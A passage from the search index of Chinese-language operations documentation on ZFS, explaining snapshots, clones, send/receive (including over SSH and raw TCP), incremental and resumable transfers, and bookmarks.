\u200b\u7684\u200b\u5feb\u7167\u200b\u90fd\u200b\u6709\u200b\u201c\u200b\u53d1\u9001\u200b\u201d\u200b\u548c\u200b\u201c\u200b\u63a5\u6536\u200b\u201d\u200b\u7684\u200b\u529f\u80fd\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u5c06\u200b\u5feb\u7167\u200b\u7684\u200b\u6570\u636e\u200b\u53d1\u9001\u5230\u200b\u5176\u4ed6\u200b\u5b58\u50a8\u200b\u6c60\u200b\uff0c\u200b\u5b9e\u73b0\u200b\u5907\u4efd\u200b\u3001\u200b\u8fc1\u79fb\u200b\u7b49\u200b\u529f\u80fd\u200b\u3002</li> </ul> <p>\u200b\u7531\u4e8e\u200b\u5185\u90e8\u200b\u539f\u7406\u200b\u7684\u200b\u4e0d\u540c\u200b\uff0cZFS \u200b\u7684\u200b\u5feb\u7167\u200b\u4e0e\u200b Btrfs \u200b\u7684\u200b\u5feb\u7167\u200b\u6709\u200b\u4e00\u4e9b\u200b\u533a\u522b\u200b\uff1a</p> <ul> <li>ZFS \u200b\u7684\u200b\u5feb\u7167\u200b\u662f\u200b\u53ea\u8bfb\u200b\u7684\u200b\uff0c\u200b\u800c\u200b Btrfs \u200b\u7684\u200b\u5feb\u7167\u200b\u662f\u200b\u53ef\u200b\u5199\u200b\u7684\u200b\u3002   \u200b\u5982\u679c\u200b\u4f60\u200b\u8981\u200b\u4fee\u6539\u200b\u4e00\u4e2a\u200b ZFS \u200b\u5feb\u7167\u200b\uff0c\u200b\u4f60\u200b\u9700\u8981\u200b\u5148\u200b\u5c06\u200b\u5176\u200b\u514b\u9686\u200b\u51fa\u6765\u200b\uff0c\u200b\u7136\u540e\u200b\u5728\u200b\u514b\u9686\u200b\u51fa\u6765\u200b\u7684\u200b\u6570\u636e\u200b\u96c6\u4e0a\u200b\u8fdb\u884c\u200b\u4fee\u6539\u200b\u3002   \u200b\u5728\u200b\u65b0\u200b\u6570\u636e\u200b\u96c6\u4e0a\u200b\u7684\u200b\u4fee\u6539\u200b\u5c06\u4f1a\u200b\u5355\u72ec\u200b\u8bb0\u5f55\u200b\uff0c\u200b\u5e76\u200b\u4e0d\u200b\u6539\u53d8\u200b\u539f\u59cb\u200b\u5feb\u7167\u200b\u7684\u200b\u5185\u5bb9\u200b\u3002</li> <li>ZFS \u200b\u7684\u200b\u5feb\u7167\u200b\u662f\u200b\u201c\u200b\u96b6\u5c5e\u4e8e\u200b\u201d\u200b\u5b83\u200b\u521b\u5efa\u200b\u65f6\u200b\u7684\u200b\u6570\u636e\u200b\u96c6\u200b\u7684\u200b\uff0c\u200b\u5373\u200b\u5feb\u7167\u200b\u4e0d\u200b\u53ef\u4ee5\u200b\u72ec\u7acb\u200b\u4e8e\u200b\u521b\u5efa\u200b\u5b83\u200b\u7684\u200b\u6570\u636e\u200b\u96c6\u200b\u5b58\u5728\u200b\u3002   \u200b\u7c7b\u4f3c\u200b\u5730\u200b\uff0c\u200b\u5982\u679c\u200b\u8981\u200b\u9500\u6bc1\u200b\u4e00\u4e2a\u200b\u6570\u636e\u200b\u96c6\u200b\uff0c\u200b\u5fc5\u987b\u200b\u5148\u200b\u9500\u6bc1\u200b\u5b83\u200b\u7684\u200b\u6240\u6709\u200b\u5feb\u7167\u200b<sup>7</sup>\u3002</li> <li> <p>\u200b\u7531\u4e8e\u200b ZFS \u200b\u7684\u200b\u65e5\u5fd7\u200b\u5f0f\u200b\u8bbe\u8ba1\u200b\uff0c\u200b\u5728\u200b\u56de\u6eda\u200b\u5feb\u7167\u200b\u65f6\u200b\uff0cZFS \u200b\u4f1a\u200b\u5c06\u200b\u6570\u636e\u200b\u96c6\u200b\u7684\u200b\u72b6\u6001\u200b\u56de\u6eda\u200b\u5230\u200b\u5feb\u7167\u200b\u521b\u5efa\u200b\u65f6\u200b\u7684\u200b\u72b6\u6001\u200b\uff0c\u200b\u5e76\u200b\u4e22\u5f03\u200b\u6b64\u540e\u200b\u7684\u200b\u6240\u6709\u200b\u65b0\u200b\u5feb\u7167\u200b\u3002</p> <p>\u200b\u7528\u200b\u201c\u200b\u65f6\u95f4\u200b\u201d\u200b\u7684\u200b\u89d2\u5ea6\u200b\u6765\u200b\u7406\u89e3\u200b ZFS \u200b\u7684\u200b\u65e5\u5fd7\u200b\u5f0f\u200b\u8bbe\u8ba1\u200b\u7684\u8bdd\u200b\uff0c\u200b\u5f53\u200b\u65f6\u95f4\u8f74\u200b\u56de\u6eda\u200b\u5230\u200b\u5feb\u7167\u200b\u521b\u5efa\u200b\u65f6\u200b\u7684\u200b\u65f6\u95f4\u200b\u70b9\u65f6\u200b\uff0c\u200b\u6240\u6709\u200b\u5728\u200b\u6b64\u200b\u65f6\u95f4\u200b\u4e4b\u540e\u200b\u7684\u200b\u6570\u636e\u200b\u90fd\u200b\u5c06\u200b\u4e0d\u590d\u5b58\u5728\u200b\uff0c\u200b\u4e5f\u200b\u5c31\u200b\u4e0d\u80fd\u200b\u5b58\u5728\u200b\u201c\u200b\u66f4\u65b0\u200b\u7684\u200b\u5feb\u7167\u200b\u201d\u200b\u4e86\u200b\uff08\u200b\u4ece\u800c\u200b\u5b83\u4eec\u200b\u5c06\u200b\u88ab\u200b\u81ea\u52a8\u200b\u9500\u6bc1\u200b\uff09\u3002</p> </li> <li> <p>\u200b\u514b\u9686\u200b\u4e00\u4e2a\u200b\u5feb\u7167\u200b\u5e76\u200b\u4e0d\u4f1a\u200b\u6539\u53d8\u200b\u8be5\u200b\u5feb\u7167\u200b\u7684\u200b\u4ece\u5c5e\u5173\u7cfb\u200b\uff0c\u200b\u5373\u200b\u514b\u9686\u200b\u51fa\u6765\u200b\u7684\u200b\u6570\u636e\u200b\u96c6\u200b\u4ecd\u7136\u200b\u96b6\u5c5e\u4e8e\u200b\u539f\u59cb\u6570\u636e\u200b\u96c6\u200b\u3002   \u200b\u4f7f\u7528\u200b <code>zfs promote</code> \u200b\u547d\u4ee4\u200b\u53ef\u4ee5\u200b\u6539\u53d8\u200b\u8fd9\u79cd\u200b\u5173\u7cfb\u200b\uff0c\u200b\u4f7f\u5f97\u200b\u5feb\u7167\u200b\u96b6\u5c5e\u4e8e\u200b\u65b0\u200b\u514b\u9686\u200b\u51fa\u6765\u200b\u7684\u200b\u6570\u636e\u200b\u96c6\u200b\uff0c\u200b\u6b64\u65f6\u200b\u539f\u59cb\u6570\u636e\u200b\u96c6\u5c06\u200b\u6210\u4e3a\u200b\u65b0\u200b\u7684\u200b\u201c\u200b\u514b\u9686\u200b\u201d\u3002</p> <p>\u200b\u6362\u53e5\u8bdd\u8bf4\u200b\uff0c\u200b\u6570\u636e\u200b\u96c6\u200b\u548c\u200b\u5feb\u7167\u200b\u7684\u200b\u5173\u7cfb\u200b\u662f\u200b\u4e00\u5bf9\u200b\u591a\u200b\u7684\u200b\uff0c\u200b\u5373\u200b\u4e00\u4e2a\u200b\u5feb\u7167\u200b\u53ea\u80fd\u200b\u96b6\u5c5e\u4e8e\u200b\u4e00\u4e2a\u200b\u6570\u636e\u200b\u96c6\u200b\uff0c\u200b\u4f46\u200b\u4e00\u4e2a\u200b\u6570\u636e\u200b\u96c6\u200b\u53ef\u4ee5\u200b\u62e5\u6709\u200b\u591a\u4e2a\u200b\u5feb\u7167\u200b\u3002 \u200b\u8fd9\u200b\u4e00\u70b9\u200b\u4e0e\u200b Git \u200b\u7684\u200b\u5206\u652f\u200b\u7ed3\u6784\u200b\u5f88\u200b\u50cf\u200b\uff0c\u200b\u4e00\u4e2a\u200b commit \u200b\u53ef\u4ee5\u200b\u6709\u200b\u591a\u4e2a\u200b\u540e\u7ee7\u200b\uff0c\u200b\u4f46\u200b\u5176\u4e2d\u200b\u53ea\u80fd\u200b\u6709\u200b\u4e00\u4e2a\u200b\u662f\u200b\u201c\u200b\u4e3b\u200b\u5206\u652f\u200b\u201d\uff0c\u200b\u4e14\u200b\u6ca1\u6709\u200b merge \u200b\u7684\u200b\u6982\u5ff5\u200b\u3002</p> <p>\u200b\u7c7b\u4f3c\u200b\u5730\u200b\uff0c\u200b\u9500\u6bc1\u200b\u4e00\u4e2a\u200b\u5feb\u7167\u200b\u4e4b\u524d\u200b\uff0c\u200b\u5fc5\u987b\u200b\u5148\u200b\u9500\u6bc1\u200b\u6240\u6709\u200b\u514b\u9686\u200b\u51fa\u6765\u200b\u7684\u200b\u6570\u636e\u200b\u96c6\u200b\u3002</p> </li> </ul> <p>\u200b\u5c3d\u7ba1\u200b ZFS \u200b\u7684\u200b\u4e0d\u540c\u200b\u6570\u636e\u200b\u96c6\u200b\u4e4b\u95f4\u200b\u5728\u200b\u5185\u5bb9\u200b\u4e0a\u200b\u662f\u200b\u4e92\u76f8\u200b\u72ec\u7acb\u200b\u7684\u200b\uff0c<code>zfs snapshot</code> \u200b\u7684\u200b <code>-r</code> \u200b\u53c2\u6570\u200b\u53ef\u4ee5\u200b\u5f88\u200b\u65b9\u4fbf\u200b\u5730\u4e3a\u200b\u4e00\u4e2a\u200b\u6570\u636e\u200b\u96c6\u200b\u53ca\u5176\u200b\u6240\u6709\u200b\u5b50\u200b\u6570\u636e\u200b\u96c6\u200b\u521b\u5efa\u200b\u201c\u200b\u5904\u4e8e\u200b\u540c\u4e00\u65f6\u95f4\u200b\u70b9\u200b\u201d\u200b\u7684\u200b\u5feb\u7167\u200b\u3002</p> <p>\u200b\u9500\u6bc1\u200b\u5feb\u7167\u200b\u7684\u200b\u547d\u4ee4\u200b\u548c\u200b\u9500\u6bc1\u200b\u6570\u636e\u200b\u96c6\u200b\u7684\u200b\u547d\u4ee4\u200b\u7c7b\u4f3c\u200b\uff0c\u200b\u6b64\u5904\u200b\u4e0d\u518d\u200b\u8d58\u8ff0\u200b\u3002</p>"},{"location":"ops/storage/zfs/#view-snapshot","title":"\u67e5\u770b\u200b\u5feb\u7167\u200b\u5185\u5bb9","text":"<p>\u200b\u5bf9\u4e8e\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\uff0cZFS \u200b\u5728\u200b\u6302\u8f7d\u200b\u70b9\u200b\u63d0\u4f9b\u200b\u4e86\u200b\u4e00\u4e2a\u200b\u9690\u85cf\u200b\u7684\u200b <code>.zfs</code> \u200b\u76ee\u5f55\u200b\uff0c\u200b\u4f60\u200b\u53ef\u4ee5\u200b\u901a\u8fc7\u200b\u8fd9\u4e2a\u200b\u76ee\u5f55\u200b\u67e5\u770b\u200b\u6240\u6709\u200b\u5feb\u7167\u200b\u7684\u200b\u5185\u5bb9\u200b\u3002 \u200b\u6240\u6709\u200b\u5feb\u7167\u200b\u90fd\u200b\u662f\u200b\u53ea\u8bfb\u200b\u7684\u200b\uff0c\u200b\u4e0d\u7528\u200b\u62c5\u5fc3\u200b\u4efb\u4f55\u200b\u8bef\u64cd\u4f5c\u200b\u3002</p> <p>\u200b\u4f8b\u5982\u200b\uff0c\u200b\u82e5\u200b\u4f60\u200b\u5728\u200b\u521b\u5efa\u200b\u5feb\u7167\u200b\u4e4b\u540e\u200b\u5220\u9664\u200b\u4e86\u200b\u4e00\u4e2a\u200b\u6587\u4ef6\u200b\uff0c\u200b\u4f60\u200b\u53ef\u4ee5\u200b\u901a\u8fc7\u200b <code>.zfs</code> \u200b\u76ee\u5f55\u200b\u6765\u200b\u67e5\u770b\u200b\u8fd9\u4e2a\u200b\u6587\u4ef6\u200b\u7684\u200b\u5185\u5bb9\u200b\uff1a</p> <pre><code>ls /tank/.zfs/snapshot/snap1\n</code></pre> <p>\u200b\u5982\u679c\u200b\u4f60\u200b\u9700\u8981\u200b\u6062\u590d\u200b\u8fd9\u4e2a\u200b\u6587\u4ef6\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u76f4\u63a5\u200b\u5c06\u200b\u5176\u200b\u590d\u5236\u200b\u51fa\u6765\u200b\u3002</p> <p>Tip</p> <p>\u200b\u7531\u4e8e\u200b <code>.zfs</code> \u200b\u76ee\u5f55\u200b\u662f\u200b\u9690\u85cf\u200b\u7684\u200b\uff0c\u200b\u56e0\u6b64\u200b\u5b83\u200b\u5728\u200b\u4efb\u4f55\u200b\u65f6\u5019\u200b\u4e0d\u4f1a\u200b\u88ab\u200b\u5217\u51fa\u200b\uff0c\u200b\u4f46\u200b\u4f60\u200b\u53ef\u4ee5\u200b\u901a\u8fc7\u200b\u8def\u5f84\u200b\u8bbf\u95ee\u200b\u5b83\u200b\uff0c\u200b\u5305\u62ec\u200b <code>cd</code> \u200b\u8fdb\u53bb\u200b\u3002 \u200b\u5982\u679c\u200b\u4f60\u200b\u60f3\u8981\u200b\u8ba9\u200b <code>.zfs</code> \u200b\u76ee\u5f55\u200b\u53ef\u89c1\u200b\uff0c\u200b\u8bf7\u200b\u53c2\u8003\u200b zfsprops(7) \u200b\u4e2d\u200b\u7684\u200b <code>snapdir</code> \u200b\u5c5e\u6027\u200b\u3002</p> <p>\u200b\u5bf9\u4e8e\u200b zvol\uff0c\u200b\u5feb\u7167\u200b\u662f\u200b\u4e0d\u53ef\u200b\u76f4\u63a5\u200b\u8bbf\u95ee\u200b\u7684\u200b\uff08\u200b\u6ca1\u6709\u200b <code>.zfs</code> \u200b\u76ee\u5f55\u200b\uff09\u3002 \u200b\u5982\u679c\u200b\u4f60\u200b\u9700\u8981\u200b\u76f4\u63a5\u200b\u8bbf\u95ee\u200b zvol \u200b\u7684\u200b\u5feb\u7167\u200b\uff0c\u200b\u8bf7\u200b\u53c2\u8003\u200b <code>snapdev</code> \u200b\u5c5e\u6027\u200b\u3002</p>"},{"location":"ops/storage/zfs/#send-receive","title":"\u53d1\u9001\u200b\u4e0e\u200b\u63a5\u6536","text":"<p><code>zfs send</code> \u200b\u547d\u4ee4\u200b\u53ef\u4ee5\u200b\u5c06\u200b\u4e00\u4e2a\u200b\u5feb\u7167\u200b\u5b8c\u6574\u200b\u4fdd\u5b58\u200b\u4e0b\u6765\u200b\uff0c\u200b\u683c\u5f0f\u200b\u4e3a\u200b ZFS \u200b\u7684\u200b\u201c\u200b\u53d1\u9001\u200b\u6d41\u200b\u201d\uff08send stream\uff09\u3002 \u200b\u8fd9\u4e2a\u200b\u6570\u636e\u6d41\u200b\u53ef\u4ee5\u200b\u4fdd\u5b58\u200b\u5728\u200b\u6587\u4ef6\u200b\u4e2d\u200b\uff0c\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u901a\u8fc7\u200b\u4efb\u4f55\u200b\u65b9\u5f0f\u200b\u4f20\u8f93\u200b\u5230\u200b\u5176\u4ed6\u200b\u673a\u5668\u200b\u4e0a\u200b\uff0c\u200b\u5982\u200b SSH\u3001\u200b\u548c\u200b\u7f51\u7edc\u200b\u4f20\u8f93\u200b\u7b49\u200b\u3002 \u200b\u5bf9\u5e94\u200b\u5730\u200b <code>zfs receive</code> \u200b\u547d\u4ee4\u200b\u5219\u200b\u53ef\u4ee5\u200b\u8bfb\u53d6\u200b\u4e00\u4e2a\u200b\u201c\u200b\u53d1\u9001\u200b\u6d41\u200b\u201d\u200b\u5e76\u200b\u636e\u6b64\u200b\u6062\u590d\u200b\u5feb\u7167\u200b\u3002</p> <p>\u200b\u4e00\u4e9b\u200b\u5e38\u89c1\u200b\u6216\u200b\u5178\u578b\u200b\u7528\u6cd5\u200b\u5982\u4e0b\u200b\uff1a</p> \u200b\u5c06\u200b\u4e00\u4e2a\u200b\u5feb\u7167\u200b\u4ece\u200b\u4e00\u4e2a\u200b\u5b58\u50a8\u200b\u6c60\u200b\u590d\u5236\u5230\u200b\u53e6\u200b\u4e00\u4e2a\u200b\u5b58\u50a8\u200b\u6c60\u4e2d\u200b<pre><code>zfs send pool0/example@snap | zfs receive pool1/example\n</code></pre> \u200b\u5c06\u200b\u4e00\u4e2a\u200b\u5feb\u7167\u200b\u4fdd\u5b58\u200b\u5230\u200b\u6587\u4ef6\u200b\u4e2d\u200b<pre><code>zfs send pool0/example@snap &gt; /tmp/example.zfs-send\n</code></pre> \u200b\u5c06\u200b\u4e00\u4e2a\u200b\u5feb\u7167\u200b\u901a\u8fc7\u200b SSH \u200b\u53d1\u9001\u81f3\u200b\u53e6\u4e00\u53f0\u200b ZFS \u200b\u5b58\u50a8\u200b\u670d\u52a1\u5668\u200b\u4e0a\u200b<pre><code>zfs send pool0/example@snap |\n  ssh user@otherserver zfs receive pool1/example\n</code></pre> \u200b\u5c06\u200b\u4e00\u4e2a\u200b\u5feb\u7167\u200b\u901a\u8fc7\u200b TCP \u200b\u53d1\u9001\u81f3\u200b\u53e6\u4e00\u53f0\u200b ZFS \u200b\u5b58\u50a8\u200b\u670d\u52a1\u5668\u200b\u4e0a\u200b<pre><code># \u200b\u53d1\u9001\u200b\u7aef\u200b\nzfs send pool0/example@snap &gt; /dev/tcp/otherserver/12345\n\n# \u200b\u63a5\u6536\u7aef\u200b\nnc -l -p 12345 | zfs receive pool1/example\n</code></pre> <p>\u200b\u5728\u200b\u4f7f\u7528\u200b <code>zfs send</code> \u200b\u548c\u200b <code>zfs receive</code> \u200b\u65f6\u200b\uff0c\u200b\u6211\u4eec\u200b\u63a8\u8350\u200b\u5728\u200b\u4f20\u8f93\u200b\u8fc7\u7a0b\u200b\u4e2d\u200b\u7684\u200b\u67d0\u4e2a\u200b\u547d\u4ee4\u884c\u200b\u4e2d\u200b\u63d2\u5165\u200b <code>pv</code> \u200b\u547d\u4ee4\u200b\uff0c\u200b\u4ee5\u4fbf\u200b\u67e5\u770b\u200b\u4f20\u8f93\u200b\u8fdb\u5ea6\u200b\uff0c\u200b\u4f8b\u5982\u200b\uff1a</p> \u200b\u901a\u8fc7\u200b TCP \u200b\u53d1\u9001\u200b\u5e76\u200b\u67e5\u770b\u200b\u4f20\u8f93\u200b\u8fdb\u5ea6\u200b<pre><code>zfs send pool0/example@snap | pv &gt; /dev/tcp/otherserver/12345\n</code></pre> <p>Tip</p> <p><code>zfs send</code> \u200b\u548c\u200b <code>zfs receive</code> \u200b\u547d\u4ee4\u200b\u5747\u200b\u6709\u200b <code>-o</code> \u200b\u53c2\u6570\u200b\uff0c\u200b\u65e2\u200b\u53ef\u4ee5\u200b\u5728\u200b\u53d1\u9001\u200b\u65f6\u200b\u6dfb\u52a0\u200b\u989d\u5916\u200b\u7684\u200b\u5c5e\u6027\u200b\uff0c\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u5728\u200b\u63a5\u6536\u200b\u65f6\u200b\u6dfb\u52a0\u200b\uff0c\u200b\u4ee5\u200b\u8986\u76d6\u200b\u539f\u6709\u200b\u7684\u200b\u5c5e\u6027\u200b\u6216\u200b\u8fdb\u884c\u200b\u65b0\u200b\u7684\u200b\u8bbe\u7f6e\u200b\uff0c\u200b\u5982\u200b\u4fee\u6539\u200b\u6302\u8f7d\u200b\u70b9\u200b\u7b49\u200b\u3002 \u200b\u8bf7\u200b\u5584\u7528\u200b\u8fd9\u4e2a\u200b\u53c2\u6570\u200b\uff0c\u200b\u4ee5\u4fbf\u200b\u66f4\u597d\u200b\u5730\u200b\u7ba1\u7406\u200b\u5feb\u7167\u200b\u7684\u200b\u4f20\u8f93\u200b\u3002</p> <p>\u200b\u6211\u4eec\u200b\u63a8\u8350\u200b\u6c38\u8fdc\u200b\u4f7f\u7528\u200b <code>zfs send -w</code>\uff0c\u200b\u8be6\u60c5\u8bf7\u200b\u53c2\u8003\u200b zfs-send(8)\u3002</p> <p>\u200b\u4f5c\u4e3a\u200b\u5907\u4efd\u200b\u7b49\u200b\u7528\u9014\u200b\u65f6\u200b\uff0c\u200b\u6211\u4eec\u200b\u63a8\u8350\u200b\u4f7f\u7528\u200b <code>zfs receive -x mountpoint -u</code>\uff08\u200b\u6216\u200b <code>-o mountpoint=</code>\uff09\uff0c\u200b\u8be6\u60c5\u8bf7\u200b\u53c2\u8003\u200b zfs-receive(8)\u3002</p>"},{"location":"ops/storage/zfs/#incremental-send","title":"\u589e\u91cf\u200b\u53d1\u9001","text":"<p>ZFS \u200b\u7684\u200b\u5feb\u7167\u200b\u53ef\u4ee5\u200b\u7528\u4e8e\u200b\u589e\u91cf\u200b\u4f20\u8f93\u200b\uff08incremental send\uff09\uff0c\u200b\u5373\u200b\u53ea\u200b\u53d1\u9001\u200b\u81ea\u200b\u4e0a\u6b21\u200b\u5feb\u7167\u200b\u4ee5\u6765\u200b\u7684\u200b\u53d8\u5316\u200b\u3002 \u200b\u589e\u91cf\u200b\u5feb\u7167\u200b\u529f\u80fd\u200b\u9700\u8981\u200b\u4e24\u7aef\u200b\u5b58\u5728\u200b\u4e00\u4e2a\u200b\u5171\u540c\u200b\u7684\u200b\u5feb\u7167\u200b\u4f5c\u4e3a\u200b\u57fa\u51c6\u200b\uff0c\u200b\u7136\u540e\u200b\u624d\u200b\u53ef\u4ee5\u200b\u53d1\u9001\u200b\u589e\u91cf\u200b\u5feb\u7167\u200b\u3002 \u200b\u4e0e\u200b\u56de\u6eda\u200b\u529f\u80fd\u200b\u7c7b\u4f3c\u200b\uff0c\u200b\u5982\u679c\u200b\u63a5\u6536\u7aef\u200b\u5728\u200b\u57fa\u51c6\u200b\u5feb\u7167\u200b\u4e4b\u540e\u200b\u6709\u8fc7\u200b\u4efb\u4f55\u200b\u4fee\u6539\u200b\uff0c\u200b\u589e\u91cf\u200b\u53d1\u9001\u200b\u5c06\u4f1a\u200b\u5931\u8d25\u200b\u3002 \u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>zfs receive -F</code> \u200b\u5f3a\u5236\u200b\u4e22\u5f03\u200b\u57fa\u51c6\u200b\u5feb\u7167\u200b\u4e4b\u540e\u200b\u7684\u200b\u6240\u6709\u200b\u6570\u636e\u200b\u3002</p> \u200b\u53d1\u9001\u200b\u589e\u91cf\u200b\u5feb\u7167\u200b<pre><code>zfs send -i pool0/example@snap1 pool0/example@snap2 | zfs receive pool1/example\n</code></pre> \u200b\u53d1\u9001\u200b\u589e\u91cf\u200b\u5feb\u7167\u200b\u548c\u200b\u6240\u6709\u200b\u4e2d\u95f4\u200b\u5feb\u7167\u200b<pre><code>zfs send -I pool0/example@snap1 pool0/example@snap2 | zfs receive pool1/example\n</code></pre>"},{"location":"ops/storage/zfs/#receive-resume","title":"\u65ad\u70b9\u7eed\u4f20","text":"<p>\u200b\u5728\u200b\u4f20\u8f93\u200b\u5927\u578b\u200b\u6570\u636e\u200b\u96c6\u65f6\u200b\uff0cZFS \u200b\u7684\u200b\u53d1\u9001\u200b\u8fc7\u7a0b\u200b\u5bb9\u6613\u200b\u56e0\u200b\u7f51\u7edc\u200b\u6ce2\u52a8\u200b\u800c\u200b\u4e2d\u65ad\u200b\uff0c\u200b\u800c\u200b\u9ed8\u8ba4\u200b\u60c5\u51b5\u200b\u4e0b\u200b\u4e2d\u65ad\u200b\u7684\u200b\u4f20\u8f93\u200b\u9700\u8981\u200b\u5b8c\u6574\u200b\u91cd\u4f20\u200b\uff0c\u200b\u8fd9\u200b\u5bb9\u6613\u200b\u6d6a\u8d39\u200b\u5927\u91cf\u200b\u7684\u200b\u65f6\u95f4\u200b\u548c\u200b\u7f51\u7edc\u5e26\u5bbd\u200b\u3002</p> <p>\u200b\u82e5\u200b\u4f60\u200b\u9884\u8ba1\u200b\u9700\u8981\u200b\u5728\u200b\u4e0d\u591f\u200b\u7a33\u5b9a\u200b\u7684\u200b\u7f51\u7edc\u200b\u73af\u5883\u200b\uff08\u200b\u5982\u200b\u516c\u7f51\u200b\uff09\u200b\u4e0b\u200b\u8fdb\u884c\u200b\u4e00\u6b21\u200b\u8f83\u5927\u200b\u7684\u200b\u4f20\u8f93\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u5728\u200b\u63a5\u6536\u7aef\u200b\u4f7f\u7528\u200b <code>zfs receive -s</code> \u200b\u53c2\u6570\u200b\u3002 \u200b\u6dfb\u52a0\u200b <code>-s</code> \u200b\u53c2\u6570\u200b\u540e\u200b\uff0c\u200b\u82e5\u200b\u5f53\u524d\u200b\u7684\u200b\u63a5\u6536\u200b\u88ab\u200b\u4e2d\u65ad\u200b\uff0c\u200b\u5219\u200b\u63a5\u6536\u200b\u5230\u200b\u4e00\u534a\u200b\u7684\u200b\u6570\u636e\u200b\u96c6\u5c06\u4f1a\u200b\u88ab\u200b\u4fdd\u7559\u200b\u4e0b\u6765\u200b\uff0c\u200b\u5e76\u4e14\u200b\u5305\u542b\u200b\u4e00\u4e2a\u200b\u5c5e\u6027\u200b <code>receive_resume_token</code>\u3002 \u200b\u4f60\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b\u4ee5\u4e0b\u200b\u547d\u4ee4\u200b\u83b7\u53d6\u200b\u8be5\u200b\u300c\u200b\u7eed\u4f20\u200b token\u300d\uff1a</p> <pre><code>zfs get receive_resume_token pool1/example\n</code></pre> <p>\u200b\u6b64\u65f6\u200b\u5728\u200b\u53d1\u9001\u200b\u7aef\u200b\u4f7f\u7528\u200b <code>zfs send -t &lt;token&gt;</code> \u200b\u5373\u53ef\u200b\u751f\u6210\u200b\u4e00\u4e2a\u200b\u300c\u200b\u65ad\u70b9\u7eed\u4f20\u200b\u6d41\u200b\u300d\uff0c\u200b\u6062\u590d\u200b\u4e4b\u524d\u200b\u88ab\u200b\u4e2d\u65ad\u200b\u7684\u200b\u4f20\u8f93\u200b\u3002</p> <p>\u200b\u653e\u5f03\u200b\u4e2d\u65ad\u200b\u7684\u200b\u4f20\u8f93\u200b</p> <p>\u200b\u5982\u679c\u200b\u4f60\u200b\u60f3\u8981\u200b\u653e\u5f03\u200b\uff08Abort\uff09\u200b\u4e00\u4e2a\u200b\u88ab\u200b\u4e2d\u65ad\u200b\u7684\u200b <code>zfs receive -s</code> \u200b\u63a5\u6536\u200b\u5e76\u200b\u5220\u9664\u200b\u5df2\u7ecf\u200b\u63a5\u6536\u200b\u4e00\u534a\u200b\u7684\u200b\u5185\u5bb9\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>-A</code> \u200b\u53c2\u6570\u200b\uff1a</p> <pre><code>zfs receive -A pool0/example\n</code></pre>"},{"location":"ops/storage/zfs/#bookmark","title":"\u4e66\u7b7e","text":"<p>\u200b\u5982\u679c\u200b\u53ea\u200b\u4f7f\u7528\u200b\u5feb\u7167\u200b\u8fdb\u884c\u200b\u5907\u4efd\u200b\u7684\u8bdd\u200b\uff0c\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u9047\u5230\u200b\u4e00\u4e2a\u200b\u95ee\u9898\u200b\uff1a\u200b\u4e3a\u4e86\u200b\u4f7f\u5f97\u200b\u540e\u7eed\u200b\u80fd\u591f\u200b\u8fdb\u884c\u200b\u589e\u91cf\u200b\u53d1\u9001\u200b\uff0c\u200b\u4e24\u7aef\u200b\u5fc5\u987b\u200b\u540c\u65f6\u200b\u4fdd\u7559\u200b\u4e00\u4e2a\u200b\u5b8c\u6574\u200b\u7684\u200b\u3001\u200b\u5171\u540c\u200b\u7684\u200b\u5feb\u7167\u200b\u3002 \u200b\u5728\u200b\u4e00\u4e9b\u200b\u573a\u666f\u200b\u4e0b\u200b\uff0c\u200b\u8fd9\u4e2a\u200b\u5b8c\u6574\u200b\u7684\u200b\u5feb\u7167\u200b\u4f1a\u200b\u963b\u6b62\u200b\u4e00\u7aef\u200b\uff08\u200b\u901a\u8fc7\u200b\u9500\u6bc1\u200b\u5feb\u7167\u200b\uff09\u200b\u91ca\u653e\u200b\u5b58\u50a8\u7a7a\u95f4\u200b\u3002 \u200b\u4e66\u7b7e\u200b\uff08bookmark\uff09\u200b\u5c31\u662f\u200b\u4e3a\u4e86\u200b\u89e3\u51b3\u200b\u8fd9\u4e2a\u200b\u95ee\u9898\u200b\u800c\u200b\u8bde\u751f\u200b\u7684\u200b\uff0c\u200b\u5b83\u200b\u8bb0\u5f55\u200b\u4e0b\u200b\u4e86\u200b\u521b\u5efa\u200b\u5feb\u7167\u200b\u7684\u200b\u65f6\u95f4\u200b\u70b9\u200b\uff0c\u200b\u4ece\u800c\u200b\u4f7f\u5f97\u200b ZFS \u200b\u80fd\u591f\u200b\u51c6\u786e\u200b\u5730\u200b\u5206\u6790\u200b\u51fa\u200b\u201c\u200b\u5728\u200b\u8fd9\u4e2a\u200b\u5feb\u7167\u200b\u4e4b\u540e\u200b\u53d1\u751f\u200b\u7684\u200b\u6240\u6709\u200b\u53d8\u5316\u200b\u201d\uff0c\u200b\u800c\u200b\u65e0\u9700\u200b\u4fdd\u7559\u200b\u5b8c\u6574\u200b\u7684\u200b\u5feb\u7167\u200b\u5185\u5bb9\u200b\u3002 \u200b\u56e0\u6b64\u200b\u4e66\u7b7e\u200b\u7684\u200b\u552f\u4e00\u200b\u7528\u9014\u200b\u5c31\u662f\u200b\u4f5c\u4e3a\u200b\u589e\u91cf\u200b\u53d1\u9001\u200b\u7684\u200b\u57fa\u51c6\u200b\uff0c\u200b\u800c\u200b\u4e0d\u80fd\u200b\u7528\u4e8e\u200b\u6062\u590d\u200b\u6570\u636e\u200b\u6216\u200b\u56de\u6eda\u200b\u72b6\u6001\u200b\u7b49\u200b\u3002</p>"},{"location":"ops/storage/zfs/#zfs-ko","title":"ZFS \u200b\u5185\u6838\u6a21\u5757\u200b\u53c2\u6570","text":"<p>ZFS \u200b\u7684\u200b\u5185\u6838\u6a21\u5757\u200b\u5177\u6709\u200b\u975e\u5e38\u200b\u591a\u200b\u7684\u200b\u53ef\u200b\u8c03\u8282\u200b\u53c2\u6570\u200b\uff0c\u200b\u5176\u4e2d\u200b\u5927\u90e8\u5206\u200b\u53c2\u6570\u200b\u53ef\u4ee5\u200b\u901a\u8fc7\u200b\u8bfb\u5199\u200b <code>/sys/module/zfs/parameters</code> 